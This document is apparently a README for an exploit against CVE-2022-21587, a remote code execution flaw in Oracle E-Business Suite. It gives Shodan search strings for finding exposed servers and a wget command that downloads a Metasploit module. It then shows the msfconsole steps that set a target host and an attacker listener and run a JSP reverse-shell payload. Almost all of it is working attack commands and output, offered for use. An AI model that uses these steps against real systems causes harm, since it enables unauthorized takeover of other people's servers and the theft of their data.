## CVE-2022-21587
![](https://img.shields.io/static/v1?label=Product&message=Oracle%20E-Business%20Suite&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=12.2.3-12.2.11&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Remote%20Code%20Execution&color=red)


- Shodan dork:
```
Oracle EBS
```
```
AppsLocalLogin.jsp
```
- Install
```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2022/Oracle_EBS/oracle_ebs_rce_cve_2022_21587.rb 
```
```
cp oracle_ebs_rce_cve_2022_21587.rb /usr/share/metasploit-framework/modules/exploits/linux/http/
```
- Usage
```
msfdb reinit; msfconsole -q
```
```
msf6 > use exploit/linux/http/oracle_ebs_rce_cve_2022_21587.rb
```
```
[*] Using configured payload java/jsp_shell_reverse_tcp
msf6 exploit(linux/http/oracle_ebs_rce_cve_2022_21587) > options

Module options (exploit/linux/http/oracle_ebs_rce_cve_2022_21587):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    8000             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (java/jsp_shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL                   no        The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Oracle EBS on Linux (OVA Install)



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/oracle_ebs_rce_cve_2022_21587) > set rhosts target_IP
msf6 exploit(linux/http/oracle_ebs_rce_cve_2022_21587) > set lhost attacker_IP
msf6 exploit(linux/http/oracle_ebs_rce_cve_2022_21587) > run
```
